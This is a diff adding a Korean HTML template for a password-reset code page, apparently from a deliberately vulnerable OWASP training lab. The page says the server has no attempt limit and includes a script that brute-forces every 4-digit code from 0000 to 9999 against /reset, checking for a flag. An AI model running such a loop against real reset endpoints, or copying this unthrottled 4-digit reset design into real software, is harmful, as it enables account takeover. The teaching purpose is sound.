@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8"/>
+  <title>코드 입력 - ResetBank</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background:#0d1117; color:#c9d1d9;
+      font-family:'Courier New',monospace;
+      display:flex; justify-content:center;
+      align-items:center; min-height:100vh; flex-direction:column; gap:20px;
+    }
+    .box {
+      background:#161b22; border:1px solid #30363d;
+      border-radius:10px; padding:40px;
+      width:100%; max-width:420px;
+    }
+    .box h2 { color:#f0f6fc; font-size:1.3rem; margin-bottom:8px; text-align:center; }
+    .box p { color:#8b949e; font-size:0.8rem; text-align:center; margin-bottom:28px; }
+    label { display:block; font-size:0.8rem; color:#8b949e; margin-bottom:6px; }
+    input[type="text"], input[type="number"] {
+      width:100%; padding:10px 14px;
+      background:#0d1117; border:1px solid #30363d;
+      border-radius:6px; color:#f0f6fc;
+      font-family:'Courier New',monospace; font-size:0.9rem;
+      margin-bottom:18px; outline:none;
+    }
+    input:focus { border-color:#a855f7; }
+    button {
+      width:100%; padding:10px; background:#a855f7;
+      border:none; border-radius:6px; color:#fff;
+      font-size:0.9rem; font-family:'Courier New',monospace;
+      cursor:pointer; transition:background 0.2s;
+    }
+    button:hover { background:#9333ea; }
+    .error {
+      background:#3d1f1f; border:1px solid #f85149;
+      color:#f85149; padding:10px 14px;
+      border-radius:6px; font-size:0.8rem; margin-bottom:18px;
+    }
+    .hint {
+      margin-top:16px; padding:12px 14px;
+      background:#1c2128; border:1px solid #30363d;
+      border-radius:6px; font-size:0.75rem; color:#8b949e; line-height:1.7;
+    }
+    .hint code {
+      background:#0d1117; padding:2px 6px;
+      border-radius:4px; color:#a855f7;
+    }
+    .brute-box {
+      background:#161b22; border:1px solid #30363d;
+      border-radius:10px; padding:24px;
+      width:100%; max-width:420px;
+    }
+    .brute-box h3 { color:#f59e0b; font-size:0.9rem; margin-bottom:12px; }
+    .brute-box p { color:#8b949e; font-size:0.8rem; margin-bottom:16px; line-height:1.7; }
+    .brute-btn {
+      width:100%; padding:10px; background:#2d1e00;
+      border:1px solid #d97706; border-radius:6px; color:#f59e0b;
+      font-size:0.85rem; font-family:'Courier New',monospace;
+      cursor:pointer; transition:all 0.2s;
+    }
+    .brute-btn:hover { background:#3d2a00; }
+    #brute-status { margin-top:12px; font-size:0.8rem; color:#8b949e; min-height:20px; }
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>🔢 인증 코드 입력</h2>
+  <p>이메일로 전송된 4자리 코드를 입력하세요.</p>
+
+  {% if error %}
+  <div class="error">⚠️ {{ error }}</div>
+  {% endif %}
+
+  <form method="POST" action="/reset" id="resetForm">
+    <input type="hidden" name="username" value="{{ username }}"/>
+    <label>아이디</label>
+    <input type="text" value="{{ username }}" disabled/>
+    <label>인증 코드 (4자리)</label>
+    <input type="text" name="token" id="tokenInput" placeholder="0000" maxlength="4" autocomplete="off"/>
+    <button type="submit">확인 →</button>
+  </form>
+
+  <div class="hint">
+    💡 힌트: 4자리 숫자 코드는 <code>0000</code> ~ <code>9999</code> 범위입니다.<br/>
+    총 10,000가지 경우의 수 — 브루트포스가 가능할까요?
+  </div>
+</div>
+
+<div class="brute-box">
+  <h3>⚡ 자동 브루트포스 시도</h3>
+  <p>서버에 횟수 제한이 없습니다.<br/>버튼을 누르면 0000부터 자동으로 시도합니다.</p>
+  <button class="brute-btn" onclick="startBrute()">🔓 브루트포스 시작</button>
+  <div id="brute-status"></div>
+</div>
+
+<script>
+  let running = false;
+
+  async function startBrute() {
+    if (running) return;
+    running = true;
+    const status = document.getElementById('brute-status');
+    const username = '{{ username }}';
+
+    for (let i = 0; i <= 9999; i++) {
+      const token = String(i).padStart(4, '0');
+      status.textContent = `시도 중: ${token} (${i}/9999)`;
+
+      const res = await fetch('/reset', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `username=${username}&token=${token}`
+      });
+      const html = await res.text();
+
+      if (html.includes('OWASP{')) {
+        status.innerHTML = `✅ 성공! 토큰: <strong style="color:#3fb950">${token}</strong> → 페이지 이동 중...`;
+        setTimeout(() => { window.location.href = '/reset'; }, 500);
+
+        // 성공한 토큰으로 폼 제출
+        document.getElementById('tokenInput').value = token;
+        document.getElementById('resetForm').submit();
+        return;
+      }
+      await new Promise(r => setTimeout(r, 10));
+    }
+    status.textContent = '실패: 토큰을 찾지 못했습니다.';
+    running = false;
+  }
+</script>
+</body>
+</html>
